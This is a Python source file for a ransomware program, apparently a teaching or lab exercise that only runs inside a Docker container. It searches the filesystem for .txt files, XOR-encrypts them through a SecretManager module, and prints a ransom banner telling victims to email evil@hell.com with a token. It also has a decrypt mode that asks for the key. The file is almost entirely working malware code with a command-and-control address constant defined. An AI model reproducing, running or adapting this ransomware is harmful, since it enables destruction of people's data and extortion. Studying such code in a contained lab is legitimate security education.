import logging
import socket
import re
import sys
from pathlib import Path
from secret_manager import SecretManager


CNC_ADDRESS = "cnc:6666"
TOKEN_PATH = "/root/token"

ENCRYPT_MESSAGE = """
  _____                                                                                           
 |  __ \                                                                                          
 | |__) | __ ___ _ __   __ _ _ __ ___   _   _  ___  _   _ _ __   _ __ ___   ___  _ __   ___ _   _ 
 |  ___/ '__/ _ \ '_ \ / _` | '__/ _ \ | | | |/ _ \| | | | '__| | '_ ` _ \ / _ \| '_ \ / _ \ | | |
 | |   | | |  __/ |_) | (_| | | |  __/ | |_| | (_) | |_| | |    | | | | | | (_) | | | |  __/ |_| |
 |_|   |_|  \___| .__/ \__,_|_|  \___|  \__, |\___/ \__,_|_|    |_| |_| |_|\___/|_| |_|\___|\__, |
                | |                      __/ |                                               __/ |
                |_|                     |___/                                               |___/ 

Your txt files have been locked. Send an email to evil@hell.com with title '{token}' to unlock your data. 
"""
class Ransomware:
    def __init__(self) -> None:
        self.check_hostname_is_docker()
    
    def check_hostname_is_docker(self)->None:
        # At first, we check if we are in a docker
        # to prevent running this program outside of container
        hostname = socket.gethostname()
        result = re.match("^[0-9a-f]{12}$", hostname)
        if result is None:
            print(f"You must run the malware in docker ({hostname}) !")
            sys.exit(1)

    def get_files(self, filter:str)->list:
        #We should first find all the files in ".txt" format
        researched_files = list(Path("/").rglob(filter))
        #Converts each found file's path as a string
        string_paths = [str(file.absolute()) for file in researched_files if file.is_file()]
        return string_paths

    def encrypt(self):
        secret_manager = SecretManager()
        files = self.get_files("*.txt")
        #First, we call the function "setup" from secret_manager.py to create salt, key and token
        secret_manager.setup()
        #Then we use our encryption algorithm (here : xor)
        secret_manager.xorfiles(files)
        #Print the encroypt message (below) and replace "token" by the new one (here in hexa)
        print(ENCRYPT_MESSAGE.format(token=secret_manager.get_hex_token()))

    def decrypt(self):
        secret_manager = SecretManager()
        #We should first prepare the secrets stocked in secret_manager.py
        secret_manager.load() 
        #while loop to find the key and retry
        while True:
            key=input("Key : ")
            try:
                #Verify if it's the right key
                secret_manager.set_key(key)
                #Find all the concerned files (.txt)
                files=self.get_files("*.txt")
                #Reuse thealgorithm in the other way (to decrypt)
                secret_manager.xorfiles(files)
                print("Well done")
                break
            #If it's the wrong key
            except Exception: print("Wrong")

if __name__ == "__main__":
    logging.basicConfig(level=logging.DEBUG)
    if len(sys.argv) < 2:
        ransomware = Ransomware()
        ransomware.encrypt()
    elif sys.argv[1] == "--decrypt":
        ransomware = Ransomware()
        ransomware.decrypt()